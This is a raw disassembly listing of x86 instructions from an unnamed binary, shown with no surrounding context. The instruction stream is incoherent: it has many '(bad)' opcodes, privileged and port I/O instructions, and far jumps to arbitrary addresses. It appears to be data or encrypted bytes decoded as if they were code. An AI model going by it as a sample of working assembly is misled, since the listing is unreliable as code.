  40d48a:	sub    bh,BYTE PTR [edx+0x33]
  40d48d:	sti    
  40d48e:	add    ebp,edi
  40d490:	cmp    eax,0x57b18190
  40d495:	arpl   ax,cx
  40d497:	cmp    DWORD PTR [ebx],ecx
  40d499:	pop    esi
  40d49a:	inc    eax
  40d49b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d49c:	jno    0x40d491
  40d49e:	aad    0x2f
  40d4a0:	xchg   ebx,eax
  40d4a1:	inc    ebx
  40d4a2:	hlt    
  40d4a3:	rcl    DWORD PTR [eax-0x3cbd1ee2],0xc2
  40d4aa:	retf   
  40d4ab:	por    mm7,QWORD PTR [edx-0x68]
  40d4af:	dec    esi
  40d4b0:	call   0xc3a1c246
  40d4b5:	icebp  
  40d4b6:	sbb    eax,0xf6acf38c
  40d4bb:	and    al,0x5e
  40d4bd:	push   0x36d0e752
  40d4c2:	mov    esi,0x920bfd57
  40d4c7:	mov    bh,0xad
  40d4c9:	into   
  40d4ca:	cmp    DWORD PTR [edx-0x6f],esi
  40d4cd:	es clc 
  40d4cf:	shl    DWORD PTR [edx],cl
  40d4d1:	and    esp,esi
  40d4d3:	test   BYTE PTR [edx+0x46],dh
  40d4d6:	cmc    
  40d4d7:	repz pop ss
  40d4d9:	xor    edi,DWORD PTR [edi+ebp*4]
  40d4dc:	in     al,dx
  40d4dd:	dec    ebx
  40d4de:	dec    ebx
  40d4df:	sub    edi,edi
  40d4e1:	imul   ecx,eax,0x4f6c999
  40d4e7:	test   al,0x95
  40d4e9:	pop    esp
  40d4ea:	jnp    0x40d558
  40d4ec:	and    DWORD PTR [edi-0x59ea1f4d],esp
  40d4f2:	mov    esi,0x3cf02fa2
  40d4f7:	inc    DWORD PTR [eax+ebx*4-0x6e]
  40d4fb:	push   edx
  40d4fc:	mov    WORD PTR [ebx-0x5f9194a0],fs
  40d502:	pop    es
  40d503:	hlt    
  40d504:	pop    DWORD PTR [ebp+0x77]
  40d507:	and    al,0xe2
  40d509:	cmc    
  40d50a:	or     ebp,DWORD PTR [eax]
  40d50c:	add    bl,dh
  40d50e:	jmp    0x98a78f5a
  40d513:	sub    DWORD PTR [esi],esp
  40d515:	pop    esp
  40d516:	xchg   BYTE PTR [ebp-0x1e84febf],ah
  40d51c:	add    dh,dh
  40d51e:	pop    edi
  40d51f:	lahf   
  40d520:	sub    BYTE PTR [ecx],bh
  40d522:	or     al,0x5f
  40d524:	pop    esp
  40d525:	pop    ecx
  40d526:	or     DWORD PTR [ecx],edi
  40d528:	or     cl,bl
  40d52a:	push   0xbec964af
  40d52f:	frstor [eax-0x1c3bde9b]
  40d535:	xchg   edx,eax
  40d536:	xchg   edx,eax
  40d537:	push   0x7c
  40d539:	mov    DWORD PTR [edi+0x31a8979a],edx
  40d53f:	call   0x6461:0x14912089
  40d546:	xlat   BYTE PTR ds:[ebx]
  40d547:	cmp    DWORD PTR [edi-0x4c98a2bc],ecx
  40d54d:	ss inc edx
  40d54f:	cmp    DWORD PTR [edi+edx*4-0xd],esp
  40d553:	sub    DWORD PTR [ecx+0x34],ecx
  40d556:	inc    ebp
  40d557:	sub    eax,esp
  40d559:	mov    edi,0xa93fe18c
  40d55e:	outs   dx,DWORD PTR ds:[esi]
  40d55f:	mov    BYTE PTR [ebp-0x37],al
  40d562:	xchg   esp,eax
  40d563:	out    0x68,eax
  40d565:	ins    BYTE PTR es:[edi],dx
  40d566:	xor    eax,ebx
  40d568:	jbe    0x40d5c6
  40d56a:	stos   DWORD PTR es:[edi],eax
  40d56b:	and    eax,0xd491b961
  40d570:	jb     0x40d5c7
  40d572:	pop    eax
  40d573:	loopne 0x40d52f
  40d575:	jle    0x40d5a9
  40d577:	pop    edi
  40d578:	pop    ebp
  40d579:	jl     0x40d502
  40d57b:	inc    esp
  40d57c:	in     al,dx
  40d57d:	dec    esi
  40d57e:	push   ds
  40d57f:	dec    esi
  40d580:	in     al,0xb7
  40d582:	jb     0x40d52b
  40d584:	jle    0x40d588
  40d586:	xor    al,0x31
  40d588:	(bad)  
  40d589:	in     eax,dx
  40d58a:	pop    edx
  40d58b:	xchg   DWORD PTR [ecx-0x48],esp
  40d58e:	dec    edi
  40d58f:	test   DWORD PTR [edi],esp
  40d591:	fldenv [esi]
  40d593:	push   esp
  40d594:	mov    bh,0xa3
  40d596:	xchg   edi,eax
  40d597:	sbb    al,0x41
  40d599:	xor    BYTE PTR [ebp-0x314ed7b8],0x4e
  40d5a0:	and    eax,eax
  40d5a2:	and    al,0xa5
  40d5a4:	lahf   
  40d5a5:	xchg   ebx,eax
  40d5a6:	inc    ecx
  40d5a7:	mov    ebp,0x25c2999f
  40d5ac:	xor    eax,0xf6699313
  40d5b1:	ins    BYTE PTR es:[edi],dx
  40d5b2:	mov    cl,0xcd
  40d5b4:	sub    dh,dl
  40d5b6:	pop    ebp
  40d5b7:	inc    edx
  40d5b8:	inc    ebp
  40d5b9:	stos   DWORD PTR es:[edi],eax
  40d5ba:	outs   dx,DWORD PTR ds:[esi]
  40d5bb:	stc    
  40d5bc:	push   ebp
  40d5bd:	ret    0x4ac4
  40d5c0:	jo     0x40d5ee
  40d5c2:	scas   al,BYTE PTR es:[edi]
  40d5c3:	adc    ebp,DWORD PTR [eax+0x5c]
  40d5c6:	call   0x299f:0xaf509fb4
  40d5cd:	dec    edi
  40d5ce:	push   ebp
  40d5cf:	loope  0x40d5ee
  40d5d1:	test   edx,0x4dff423c
  40d5d7:	dec    esi
  40d5d8:	jnp    0x40d5d6
  40d5da:	and    BYTE PTR [esi],dh
  40d5dc:	repz ficom WORD PTR [ecx+ebp*8-0x63bf664e]
  40d5e4:	mov    esp,0xa3a1bb0
  40d5e9:	fwait
  40d5ea:	jmp    0xe82e2316
  40d5ef:	add    BYTE PTR [edi+0x5ed46cd3],dh
  40d5f5:	jecxz  0x40d652
  40d5f7:	mov    cl,0x4
  40d5f9:	ja     0x40d66e
  40d5fb:	push   ebx
  40d5fc:	mov    ebx,esp
  40d5fe:	(bad)  
  40d5ff:	std    
  40d600:	(bad)  
  40d601:	fsubr  QWORD PTR [ebx-0x32]
  40d604:	out    0x34,eax
  40d606:	add    BYTE PTR [ebx-0x799e6f0a],dh
  40d60c:	outs   dx,BYTE PTR ds:[esi]
  40d60d:	push   eax
  40d60e:	sbb    eax,0x1ec3b1dd
  40d613:	jbe    0x40d638
  40d615:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d616:	push   ebx
  40d617:	adc    DWORD PTR [edx],ebp
  40d619:	fidiv  WORD PTR [eax]
  40d61b:	jg     0x40d646
  40d61d:	mov    WORD PTR [edx+eax*8-0x107a35e8],fs
  40d624:	lods   eax,DWORD PTR ds:[esi]
  40d625:	pop    ebx
  40d626:	js     0x40d686
  40d628:	fcomp  QWORD PTR [edi+ecx*2]
  40d62b:	in     al,dx
  40d62c:	jmp    0xcd4e:0x7b765d51
  40d633:	lods   eax,DWORD PTR ds:[esi]
  40d634:	jle    0x40d6a7
  40d636:	adc    BYTE PTR [ebx-0x7d],bh
  40d639:	(bad)  
  40d63a:	dec    eax
  40d63b:	(bad)  
  40d63c:	shr    DWORD PTR [ebp+0x71],cl
  40d63f:	scas   eax,DWORD PTR es:[edi]
  40d640:	fs aaa 
  40d642:	adc    DWORD PTR [eax],0xb
  40d645:	cmp    bl,dh
  40d647:	rol    edi,1
  40d649:	nop
  40d64a:	add    DWORD PTR [edx-0x9],0x544f805f
  40d651:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d652:	pop    edi
  40d653:	daa    
  40d654:	mov    al,ds:0x37c1a80d
  40d659:	les    eax,FWORD PTR [ecx]
  40d65b:	xor    esp,DWORD PTR [ebp+0x37d9cf42]
  40d661:	js     0x40d687
  40d663:	mov    dl,0xbf
  40d665:	imul   eax,esi,0xf634f1a7
  40d66b:	cmp    DWORD PTR [eax+eax*1-0x24],ebp
  40d66f:	xchg   esp,eax
  40d670:	sbb    DWORD PTR [eax],ecx
  40d672:	sbb    DWORD PTR [eax-0x38],0xffffff88
  40d676:	pushf  
  40d677:	xor    cl,BYTE PTR [eax]
  40d679:	pop    esi
  40d67a:	call   0x5cab1391
  40d67f:	and    BYTE PTR [ebx+eiz*8],0xd0
  40d683:	fnstcw WORD PTR [eax+0xe]
  40d686:	jle    0x40d66b
  40d688:	cmp    edx,ecx
  40d68a:	cmp    esp,DWORD PTR [ecx+0x1b1ffadd]
  40d690:	xor    edi,esi
  40d692:	pop    ss
  40d693:	dec    esi
  40d694:	cmp    al,0x51
  40d696:	lods   al,BYTE PTR ds:[esi]
  40d697:	xor    eax,0xefe482d3
  40d69c:	in     al,0x56
  40d69e:	xchg   edx,eax
  40d69f:	add    BYTE PTR [edi+0x2226e7f6],al
  40d6a5:	pop    ds
  40d6a6:	and    esp,DWORD PTR [edx-0x6018966f]
  40d6ac:	ins    BYTE PTR es:[edi],dx
  40d6ad:	sub    ebx,DWORD PTR [edi-0x2db51823]
  40d6b3:	jg     0x40d6cd
  40d6b5:	xor    ah,BYTE PTR ds:0xe025283b
  40d6bb:	pop    ebx
  40d6bc:	sub    BYTE PTR [esi-0x59ba3db1],ch
  40d6c2:	mov    edi,0x903e8e67
  40d6c7:	test   DWORD PTR [ebx+0x34],ebp
  40d6ca:	cwde   
  40d6cb:	inc    edi
  40d6cc:	test   al,0x92
  40d6ce:	test   DWORD PTR [edi+0x3facabcc],ecx
  40d6d4:	popa   
  40d6d5:	xor    BYTE PTR [eax-0x5fcda74d],bl
  40d6db:	inc    eax
  40d6dc:	jge    0x40d710
  40d6de:	inc    edx
  40d6df:	jb     0x40d732
  40d6e1:	cmp    BYTE PTR [esi],bl
  40d6e3:	shl    ebp,0xab
  40d6e6:	or     BYTE PTR [eax],ch
  40d6e8:	(bad)  
  40d6e9:	gs imul edx,ebx,0xffffffef
  40d6ed:	sub    BYTE PTR [esp+eiz*2-0x49],0x27
  40d6f2:	dec    eax
  40d6f3:	sbb    BYTE PTR [esi+0x5496e62d],al
  40d6f9:	and    al,0xa4
  40d6fb:	mov    ah,0x44
  40d6fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d6fe:	mov    ah,BYTE PTR [edx]
  40d700:	imul   eax,DWORD PTR [ebp+eax*8-0x27],0x46
  40d705:	(bad)  
  40d706:	and    al,BYTE PTR [esi+0x5f]
  40d709:	out    dx,al
  40d70a:	cmp    dh,BYTE PTR [ebp+0x8ba55d9]
  40d710:	pop    ebp
  40d711:	xchg   esp,eax
  40d712:	je     0x40d730
  40d714:	mov    dl,0x24
  40d716:	sbb    BYTE PTR [eax-0x61],ah
  40d719:	hlt    
  40d71a:	lock cmp al,0xda
  40d71d:	hlt    
  40d71e:	dec    edi
  40d71f:	mov    esp,0x7b84f527
  40d724:	mov    al,0x4b
  40d726:	test   DWORD PTR [ebx-0x7d7f319],esp
  40d72c:	sub    al,BYTE PTR [ecx-0x512cef4a]
  40d732:	ds pop eax
  40d734:	adc    BYTE PTR [eax-0x5],ch
  40d737:	cmc    
  40d738:	jge    0x40d6ea
  40d73a:	repnz movzx ecx,BYTE PTR [esi+0x70]
  40d73f:	popa   
  40d740:	into   
  40d741:	cmp    cl,BYTE PTR [ecx]
  40d743:	jmp    0x40d722
  40d745:	pop    ds
  40d746:	xor    DWORD PTR [ebx-0x7b],0x31
  40d74a:	ins    BYTE PTR es:[edi],dx
  40d74b:	sub    ch,BYTE PTR [edi+0x2cafc271]
  40d751:	xor    BYTE PTR [edx+0x70010abd],al
  40d757:	fcomp  QWORD PTR [esi-0x5e1580d9]
  40d75d:	daa    
  40d75e:	inc    ecx
  40d75f:	out    0x4,al
  40d761:	aaa    
  40d762:	les    eax,FWORD PTR [edi]
  40d764:	clc    
  40d765:	in     al,dx
  40d766:	js     0x40d723
  40d768:	clc    
  40d769:	std    
  40d76a:	cmp    al,0x21
  40d76c:	test   DWORD PTR [edi-0x55],ebp
  40d76f:	pushf  
  40d770:	cmp    DWORD PTR ds:[ebx+0x40],edx
  40d774:	imul   ecx,DWORD PTR [edi-0x2c7cc082],0xffffffc4
  40d77b:	cmp    eax,0x95feb707
  40d780:	out    dx,al
  40d781:	ficomp WORD PTR [ebx+edi*8+0x23d17067]
  40d788:	into   
  40d789:	push   eax
  40d78a:	push   0x9d21fc9d
  40d78f:	xchg   ah,al
  40d791:	fnsave [edx-0x621ca9f2]
  40d797:	shl    bl,1
  40d799:	rcl    BYTE PTR [edx-0x3c08e8a6],cl
  40d79f:	mov    eax,0xb63c3d6
  40d7a4:	adc    eax,0x582afb3b
  40d7a9:	mov    ds:0x90a287a3,al
  40d7ae:	shl    DWORD PTR [ecx-0x4f8f6cb2],cl
  40d7b4:	sbb    DWORD PTR [edx+0x1af5df3b],0x48
  40d7bb:	retf   
  40d7bc:	mov    al,0x6
  40d7be:	mov    al,ds:0x1a3faaca
  40d7c3:	push   ebp
  40d7c4:	test   dh,cl
  40d7c6:	fld    TBYTE PTR [esi+0x19]
  40d7c9:	add    al,0x48
  40d7cb:	ror    al,1
  40d7cd:	lods   al,BYTE PTR ds:[esi]
  40d7ce:	dec    eax
  40d7cf:	mov    ds,WORD PTR ds:0xe7970469
  40d7d5:	fimul  WORD PTR [ebx+0x28f0e24a]
  40d7db:	xor    eax,0x4df0f5f1
  40d7e0:	xor    bl,BYTE PTR [edi-0x80]
  40d7e3:	and    esi,edi
  40d7e5:	jmp    0x40d818
  40d7e7:	dec    ebp
  40d7e8:	leave  
  40d7e9:	jne    0x40d859
  40d7eb:	mov    DWORD PTR [eax+0x43],ebx
  40d7ee:	and    eax,0x6d05c8b0
  40d7f3:	xchg   BYTE PTR [ecx],bh
  40d7f5:	(bad)  
  40d7f6:	test   eax,0x80739666
  40d7fb:	out    0x23,eax
  40d7fd:	push   ss
  40d7fe:	(bad)  
  40d800:	enter  0xd5f5,0x96
  40d804:	dec    edi
  40d805:	idiv   BYTE PTR [esi+0x7f]
  40d808:	sub    eax,0xd3d13b09
  40d80e:	mov    edi,0x489ff230
  40d813:	std    
  40d814:	dec    ecx
  40d815:	mov    ebx,0x936b6b45
  40d81a:	daa    
  40d81b:	in     eax,0x1
  40d81d:	les    ebp,FWORD PTR [edi-0x78]
  40d820:	cwde   
  40d821:	fisub  DWORD PTR [ecx+eiz*2-0x69]
  40d825:	pop    esi
  40d826:	clc    
  40d827:	add    DWORD PTR [edx+0x14],0x8
  40d82b:	out    0x95,eax
  40d82d:	fisttp QWORD PTR [esi]
  40d82f:	jp     0x40d872
  40d831:	les    eax,FWORD PTR ds:[ecx-0x3dc52767]
  40d838:	jnp    0x40d7e8
  40d83a:	fidiv  DWORD PTR [ebp-0x2d004a8d]
  40d840:	mov    al,0x69
  40d842:	das    
  40d843:	data16 outs dx,BYTE PTR ds:[esi]
  40d845:	mov    ebp,0x56069310
  40d84a:	lahf   
  40d84b:	push   ss
  40d84c:	call   0x95a7:0x6dac329d
  40d853:	sar    DWORD PTR [eax-0x6],0x8f
  40d857:	nop
  40d858:	call   0x30ec:0xcbea58f0
  40d85f:	test   BYTE PTR [esi-0x68],bh
  40d862:	pop    es
  40d863:	sbb    eax,0xcac908f1
  40d868:	sbb    al,0x9c
  40d86a:	sbb    ebp,edx
  40d86c:	stos   BYTE PTR es:[edi],al
  40d86d:	cmp    BYTE PTR [esi+0x62],dh
  40d870:	ror    BYTE PTR [edi+edi*1+0xc],1
  40d874:	sti    
  40d875:	fsubr  QWORD PTR [ebx-0x3]
  40d878:	mov    bh,0x40
  40d87a:	pusha  
  40d87b:	jg     0x40d86c
  40d87d:	pop    edx
  40d87e:	ins    DWORD PTR es:[edi],dx
  40d87f:	add    esi,DWORD PTR [esp+ecx*2]
  40d882:	inc    ebx
  40d883:	xchg   esi,eax
  40d884:	or     ebp,edi
  40d886:	in     eax,0xe1
  40d888:	mov    bh,0x4f
  40d88a:	xchg   edx,eax
  40d88b:	add    dl,BYTE PTR [edi]
  40d88d:	push   cs
  40d88e:	jmp    0xf6b91e15
  40d893:	and    BYTE PTR [eax],0x1e
  40d896:	scas   eax,DWORD PTR es:[edi]
  40d897:	xchg   esp,eax
  40d898:	sub    bh,ch
  40d89a:	mov    dh,0x6b
  40d89c:	call   0xfab457ab
  40d8a1:	mov    cl,0xc
  40d8a3:	push   eax
  40d8a4:	push   esi
  40d8a5:	call   0xfc27:0x232f2940
  40d8ac:	(bad)  
  40d8ad:	js     0x40d8eb
  40d8af:	into   
  40d8b0:	cmc    
  40d8b1:	daa    
  40d8b2:	sbb    eax,0xf13b8635
  40d8b7:	pushf  
  40d8b8:	fisttp WORD PTR [ecx-0x41113f54]
  40d8be:	fnstcw WORD PTR [edx+ebp*2]
  40d8c1:	xor    eax,ecx
  40d8c3:	sahf   
  40d8c4:	daa    
  40d8c5:	add    al,BYTE PTR [eax+0x10]
  40d8c8:	lods   al,BYTE PTR ds:[esi]
  40d8c9:	cld    
  40d8ca:	lods   al,BYTE PTR ds:[esi]
  40d8cb:	push   ebp
  40d8cc:	inc    esp
  40d8cd:	or     eax,0x5d759f88
  40d8d2:	imul   ecx,eax,0xf40938c3
  40d8d8:	or     bh,bh
  40d8da:	gs pop ecx
  40d8dc:	add    ebx,ebx
  40d8de:	xchg   ebx,eax
  40d8df:	jne    0x40d8e4
  40d8e1:	addr16 dec ebx
  40d8e3:	ret    
  40d8e4:	push   eax
  40d8e5:	retf   
  40d8e6:	inc    esp
  40d8e7:	fstp   QWORD PTR [ebp-0x34]
  40d8ea:	popf   
  40d8eb:	adc    DWORD PTR [esi],esp
  40d8ed:	fimul  DWORD PTR [esp+esi*8]
  40d8f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d8f1:	mov    edi,0xe01c9279
  40d8f6:	nop
  40d8f7:	rcl    BYTE PTR [ebx+0x4d3e9de5],1
  40d8fd:	push   ebx
  40d8fe:	int    0xb3
  40d900:	loop   0x40d8a3
  40d902:	sahf   
  40d903:	(bad)
  40d907:	inc    ebx
  40d908:	(bad)  
  40d909:	push   esp
  40d90a:	std    
  40d90b:	pop    ebp
  40d90c:	jns    0x40d91f
  40d90e:	in     al,0x9c
  40d910:	enter  0xdcf6,0x51
  40d914:	push   ecx
  40d915:	jne    0x40d8aa
  40d917:	into   
  40d918:	fist   DWORD PTR [edx+eax*2]
  40d91b:	inc    ebx
  40d91c:	das    
  40d91d:	test   DWORD PTR [eax-0x5e],esp
  40d920:	ins    BYTE PTR es:[edi],dx
  40d921:	lea    ebx,[esi+0x7e]
  40d924:	mov    edx,0xdbd89058
  40d929:	sti    
  40d92a:	mov    dh,BYTE PTR [ecx-0x1b]
  40d92d:	pop    esi
  40d92e:	cmp    dh,bh
  40d930:	aas    
  40d931:	or     ch,bl
  40d933:	inc    ecx
  40d934:	pop    edi
  40d935:	out    0xdb,al
  40d937:	mov    ch,0xd1
  40d939:	fcomp  QWORD PTR [edx]
  40d93b:	inc    eax
  40d93c:	nop
  40d93d:	dec    ebp
  40d93e:	sub    ecx,DWORD PTR [ebx+ecx*1-0x5f]
  40d942:	(bad)  
  40d943:	xchg   esi,eax
  40d944:	repz add al,0xa3
  40d947:	xor    eax,0x8a938c4f
  40d94c:	lods   eax,DWORD PTR ds:[esi]
  40d94d:	xor    DWORD PTR [edi],edx
  40d94f:	mov    al,0xa7
  40d951:	mov    bl,0xa9
  40d953:	test   eax,0x15721043
  40d958:	pop    edi
  40d959:	nop
  40d95a:	push   ebx
  40d95b:	add    ah,bh
  40d95d:	aad    0xe2
  40d95f:	mov    BYTE PTR [edx-0x9745d9a],bl
  40d965:	push   ebx
  40d966:	mov    ds:0xe3a7dc52,al
  40d96b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d96c:	sbb    ch,ah
  40d96e:	jle    0x40d9ce
  40d970:	test   al,cl
  40d972:	loope  0x40d9c7
  40d974:	ja     0x40d9d6
  40d976:	(bad)  
  40d977:	cli    
  40d978:	popa   
  40d979:	inc    ecx
  40d97a:	jle    0x40d922
  40d97c:	jo     0x40d987
  40d97e:	mov    BYTE PTR [edi-0x38bfac56],al
  40d984:	pop    ecx
  40d985:	ja     0x40d9f8
  40d987:	xor    cl,BYTE PTR [ecx-0x32539084]
  40d98d:	fs push edx
  40d98f:	cmp    BYTE PTR [edi-0xac2bcd7],bl
  40d995:	fdivr  DWORD PTR ds:0xeff15cfb
  40d99b:	xor    DWORD PTR [ecx-0x7c],ebx
  40d99e:	cwde   
  40d99f:	lods   eax,DWORD PTR ds:[esi]
  40d9a0:	imul   edi,edi,0x3e1a398c
  40d9a6:	dec    edi
  40d9a7:	(bad)  
  40d9a8:	cld    
  40d9a9:	push   esp
  40d9aa:	mov    WORD PTR [ebx],?
  40d9ac:	fisub  DWORD PTR [ecx-0x1651ce63]
  40d9b2:	jmp    0xb95fbbe8
  40d9b7:	aaa    
  40d9b8:	sbb    DWORD PTR [ebx-0x4],esi
  40d9bb:	xlat   BYTE PTR ds:[ebx]
  40d9bc:	in     eax,0x82
  40d9be:	leave  
  40d9bf:	xlat   BYTE PTR ds:[ebx]
  40d9c0:	or     BYTE PTR [esi-0x59223af1],bh
  40d9c6:	pushf  
  40d9c7:	aad    0xd0
  40d9c9:	ficom  DWORD PTR [ebp+0x729d365e]
  40d9cf:	xchg   esp,eax
  40d9d0:	or     DWORD PTR [edi],0x4f
  40d9d3:	sbb    DWORD PTR [edi*4+0x35cfc32d],0x9317d41a
  40d9de:	inc    edi
  40d9df:	inc    ebp
  40d9e0:	pop    ss
  40d9e1:	fistp  DWORD PTR [eax+0x41]
  40d9e4:	xlat   BYTE PTR ds:[ebx]
  40d9e5:	fs rcr ah,0x74
  40d9e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d9ea:	pop    ds
  40d9eb:	add    DWORD PTR [ebx-0x16d86126],esi
  40d9f1:	aam    0xf8
  40d9f3:	inc    eax
  40d9f4:	ins    DWORD PTR es:[edi],dx
  40d9f5:	sbb    DWORD PTR [ebp+0x6c],0x6403d12f
  40d9fc:	ja     0x40d9bd
  40d9fe:	cmp    cl,BYTE PTR [eax-0xf]
  40da01:	pop    es
  40da02:	jne    0x40da5a
  40da04:	aas    
  40da05:	jp     0x40d9f7
  40da07:	sub    BYTE PTR [eax],0x38
  40da0a:	fisttp QWORD PTR [ebx]
  40da0c:	or     BYTE PTR [ebp+0x3fbb2f2d],0x22
  40da13:	mov    ebp,0x46faeaa3
  40da18:	cli    
  40da19:	mov    edi,0xa0fe551a
  40da1e:	mov    cl,0x3c
  40da20:	jo     0x40da5f
  40da22:	div    DWORD PTR [esp+eiz*2]
  40da25:	mov    esi,0x7e94e8a0
  40da2a:	cmp    al,BYTE PTR [ebx-0x5deb0942]
  40da30:	test   al,0xf
  40da32:	scas   eax,DWORD PTR es:[edi]
  40da33:	sub    ebx,DWORD PTR [eax+0x1ad08b9d]
  40da39:	out    dx,eax
  40da3a:	sub    ecx,esi
  40da3c:	addps  xmm4,XMMWORD PTR ds:0x964197cc
  40da43:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40da44:	daa    
  40da45:	pop    ds
  40da46:	mov    ds:0x8387443f,eax
  40da4b:	push   0x7298e9c4
  40da50:	icebp  
  40da51:	shr    dh,1
  40da53:	call   0x2ef43cd
  40da58:	iret   
  40da59:	pop    ebp
  40da5b:	ins    DWORD PTR es:[edi],dx
  40da5c:	int    0xe5
  40da5e:	pop    edx
  40da5f:	or     BYTE PTR [ebx-0x5beb4451],cl
  40da65:	jmp    0x63eb:0x30715dc1
  40da6c:	mov    ecx,0x830376a7
  40da71:	jmp    0xd663e314
  40da76:	lods   eax,DWORD PTR ds:[esi]
  40da77:	adc    eax,0x9f8f9e57
  40da7c:	out    0x3f,al
  40da7e:	ja     0x40da12
  40da80:	sbb    eax,0xfbf70844
  40da85:	mov    eax,ds:0xd054f069
  40da8a:	push   0x46
  40da8c:	mov    bl,0x5
  40da8e:	add    DWORD PTR gs:[esi+0x294c1848],edi
  40da95:	aam    0x40
  40da97:	test   BYTE PTR [ecx],bh
  40da99:	stos   BYTE PTR es:[edi],al
  40da9a:	lea    esi,[esi+0x7e]
  40da9d:	imul   ecx,DWORD PTR [eax],0xffffffc9
  40daa0:	pop    esi
  40daa1:	rol    BYTE PTR [ebx-0x1c],1
  40daa4:	inc    edx
  40daa5:	mov    bh,0x67
  40daa7:	stos   DWORD PTR es:[edi],eax
  40daa8:	pop    ss
  40daa9:	test   BYTE PTR [ebx],bl
  40daab:	aaa    
  40daac:	pusha  
  40daad:	jo     0x40db04
  40daaf:	pushf  
  40dab0:	mov    dl,BYTE PTR [edx+eax*2]
  40dab3:	pop    ecx
  40dab4:	aas    
  40dab5:	jmp    0x73653aee
  40daba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dabb:	pop    ss
  40dabc:	and    DWORD PTR [eax+0x37a212f4],esp
  40dac2:	loope  0x40db15
  40dac4:	cmp    DWORD PTR [esp+ebx*1-0x709d7f37],edx
  40dacb:	xor    esi,edi
  40dacd:	push   edx
  40dace:	outs   dx,DWORD PTR ds:[esi]
  40dacf:	rcr    cl,1
  40dad1:	fmul   DWORD PTR [esi-0x1]
  40dad4:	test   DWORD PTR ds:0x5afc111b,ebx
  40dada:	jge    0x40daa6
  40dadc:	mov    dh,0x9b
  40dade:	sbb    eax,0x1fc9d12b
  40dae3:	jno    0x40da92
  40dae5:	lock out 0xd1,al
  40dae8:	popa   
  40dae9:	int3   
  40daea:	clc    
  40daeb:	or     eax,0xcb988f70
  40daf0:	cmp    ch,ah
  40daf2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40daf3:	push   edx
  40daf4:	js     0x40db66
  40daf6:	pusha  
  40daf7:	or     dh,BYTE PTR [ecx-0x53]
  40dafa:	adc    eax,0xe4bac092
  40daff:	xor    al,0x29
  40db01:	imul   DWORD PTR [esi+eiz*4+0x33]
  40db05:	jb     0x40db4c
  40db07:	adc    eax,ebp
  40db09:	jae    0x40db47
  40db0b:	xor    al,0x16
  40db0d:	(bad)  
  40db0f:	lods   al,BYTE PTR ds:[esi]
  40db10:	outs   dx,DWORD PTR ds:[esi]
  40db11:	fisttp DWORD PTR [esi]
  40db13:	mov    ebp,0x4f057834
  40db18:	push   ebp
  40db19:	cmc    
  40db1a:	jb     0x40db9b
  40db1c:	int    0x67
  40db1e:	dec    ecx
  40db1f:	jb     0x40daf4
  40db21:	jmp    DWORD PTR [eax-0xf]
  40db24:	xchg   esp,eax
  40db25:	mov    ah,0x6e
  40db27:	iret   
  40db28:	je     0x40db09
  40db2a:	rol    cl,0x28
  40db2d:	mov    bl,0x8e
  40db2f:	jmp    0x40db89
  40db31:	pushf  
  40db32:	push   esi
  40db33:	sti    
  40db34:	mov    al,0xf0
  40db36:	in     al,0x14
  40db38:	(bad)  
  40db39:	adc    esp,edi
  40db3b:	xchg   esi,eax
  40db3c:	push   esi
  40db3d:	pusha  
  40db3e:	xchg   ebp,eax
  40db3f:	popf   
  40db40:	sbb    ch,bh
  40db42:	jnp    0x40dbb6
  40db44:	xchg   esp,eax
  40db45:	mov    ecx,0x1bb3354e
  40db4a:	mov    WORD PTR [eax+0x47],ss
  40db4d:	push   0xffffffeb
  40db4f:	jnp    0x40dbaa
  40db51:	jecxz  0x40db4b
  40db53:	sbb    DWORD PTR [edx],edi
  40db55:	pop    ss
  40db56:	fldcw  WORD PTR [ebx-0x197de2c]
  40db5c:	fdiv   QWORD PTR [eax+0x47f3b640]
  40db62:	jecxz  0x40db37
  40db64:	sahf   
  40db65:	pop    ds
  40db66:	and    al,0xa4
  40db68:	pop    ebp
  40db69:	jge    0x40db80
  40db6b:	fisttp DWORD PTR [ebp+0x7e]
  40db6e:	daa    
  40db6f:	sub    eax,DWORD PTR [edi]
  40db71:	pop    edx
  40db72:	sbb    esp,esi
  40db74:	div    BYTE PTR [ebx+0x6da6e1ca]
  40db7a:	inc    ebp
  40db7b:	push   ebx
  40db7c:	and    ah,ah
  40db7e:	pushf  
  40db7f:	data16 aad 0xb3
  40db82:	jg     0x40dbac
  40db84:	sbb    dl,BYTE PTR [ebp+ecx*2+0x411b2453]
  40db8b:	jmp    0xd334:0x9e4c3233
  40db92:	xchg   edi,eax
  40db93:	sbb    DWORD PTR ds:[edi],ebx
  40db96:	bound  ebx,QWORD PTR [edx-0x6f]
  40db99:	push   edi
  40db9a:	fsubrp st(6),st
  40db9c:	mov    edi,0xc30181ae
  40dba1:	sub    eax,0x24b834fd
  40dba6:	sub    esp,DWORD PTR [ebp+0x9a1b8d9]
  40dbac:	xor    cl,BYTE PTR [ecx]
  40dbae:	adc    al,0xf2
  40dbb0:	in     al,0x57
  40dbb2:	inc    ebp
  40dbb3:	sbb    DWORD PTR [esi+0x196a27dc],eax
  40dbb9:	(bad)  
  40dbba:	mov    dl,0x50
  40dbbc:	sub    eax,DWORD PTR [ebp-0x23]
  40dbbf:	fwait
  40dbc0:	outs   dx,BYTE PTR ds:[esi]
  40dbc1:	jbe    0x40dba2
  40dbc3:	clc    
  40dbc4:	pop    ebp
  40dbc5:	shl    BYTE PTR [ebp-0x2200671c],1
  40dbcb:	jb     0x40db5f
  40dbcd:	mov    ds:0xc1d60456,al
  40dbd2:	sub    al,0x93
  40dbd4:	jb     0x40db9c
  40dbd6:	ss ja  0x40dc55
  40dbd9:	push   eax
  40dbda:	scas   al,BYTE PTR es:[edi]
  40dbdb:	pop    ebx
  40dbdc:	inc    edi
  40dbdd:	ins    BYTE PTR es:[edi],dx
  40dbde:	sub    bl,BYTE PTR [edi-0x1f2dfccd]
  40dbe4:	add    dl,bl
  40dbe6:	jmp    0x38e3ddd7
  40dbeb:	inc    ecx
  40dbec:	cdq    
  40dbed:	(bad)  
